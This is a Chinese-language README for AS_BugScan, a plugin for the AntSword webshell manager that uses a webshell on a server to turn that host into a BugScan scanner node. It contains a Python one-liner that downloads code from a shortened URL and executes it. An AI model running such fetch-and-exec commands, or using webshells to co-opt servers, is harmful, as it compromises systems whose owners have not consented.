# AS_BugScan

> AntSword 创建 BugScan 节点插件

通过 WebShell 创建BugScan节点。

## 安装

### 商店安装

进入 AntSword 插件中心，选择 AS_BugScan,点击安装

### 手动安装

1. 获取源代码

	```
	git clone https://github.com/Medicean/AS_BugScan.git
	```
	
	或者
	
	点击 [这里](https://github.com/Medicean/AS_BugScan/archive/master.zip) 下载源代码，并解压。

2. 拷贝源代码至插件目录

    将插件目录拷贝至 `antSword/antData/plugins/` 目录下即安装成功


## 使用

1. 在`虚拟终端`下检查 `Python2.7` 是否在环境变量中

 在终端下直接输入 `python -V` 如果有输出，你可以继续进行，如果提示找不到 `python`, 请先将 `python` 添加至环境变量中。

2. 访问 [BugScan](https://www.bugscan.net) 进入扫描器。点击添加任务，在`节点`子栏下获取你个人的创建节点链接。

 假如在页面显示的为:
 
 ```
    python -c "exec(__import__('urllib2').urlopen('http://t.cn/Rqu1SmB?xxxxxxx').read())" -m 5
 ```
 那么在本插件 URL 部分应该填写 `urlopen` 函数部分中的 URL:

 ```
    http://t.cn/Rqu1SmB?xxxxxxx
 ```

3. `最大任务数` 输入框中控制一个节点能接受的最大目标数，默认为 5

4. 点击开始即可尝试创建 BugScan 节点。创建成功后，在 BugScan 添加任务页面即可看到你的节点。

## 相关链接

* [AntSword 文档](http://doc.uyu.us)
* [BugScan](https://www.bugscan.net)
* [dhtmlx 文档](http://docs.dhtmlx.com/)
